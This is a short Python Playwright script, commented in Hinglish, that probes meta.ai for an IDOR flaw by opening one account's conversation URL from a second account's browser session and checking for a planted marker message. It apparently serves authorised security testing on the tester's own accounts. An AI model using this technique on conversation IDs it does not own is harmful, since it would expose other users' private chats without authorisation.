import time
from playwright.sync_api import sync_playwright

def test_idor():
    with sync_playwright() as p:
        # Yeh Account B ka profile folder hai
        user_data_dir = "./meta_browser_profile_account_B"
        
        print("Browser launch ho raha hai (Account B)...")
        browser = p.chromium.launch_persistent_context(
            user_data_dir=user_data_dir,
            headless=False,
            viewport={"width": 1280, "height": 800}
        )
        
        page = browser.new_page()
        
        # Yahan apni Account A ki conversation ID paste karein
        target_conversation_id = "bb00cf81-7a37-4f06-b21b-be58bc3cdda3"
        target_url = f"https://www.meta.ai/c/{target_conversation_id}"
        
        print(f"Target URL open ho raha hai: {target_url}")
        page.goto(target_url)
        
        print("---")
        print("Kripya browser window check karein:")
        print("1. Agar login page aaye, toh apne **Account B** ki details se login kar lein.")
        print("2. Dekhein ki kya Account A ki chat open hoti hai ya error aata hai.")
        print("---")
        
        # Page load hone ka wait karte hain
        time.sleep(8)
        
        # Check karte hain ki kya page par woh secret message dikh raha hai
        page_content = page.content()
        if "Secret Audit Test by Account A 123" in page_content:
            print("\n[!] 🚨 VULNERABILITY FOUND: IDOR Success! Account B can see Account A's chat!")
        else:
            print("\n[-] 🛡️ Secure: Chat load nahi hui, access denied ya redirect ho gaya.")
            
        time.sleep(10)
        browser.close()

if __name__ == "__main__":
    test_idor()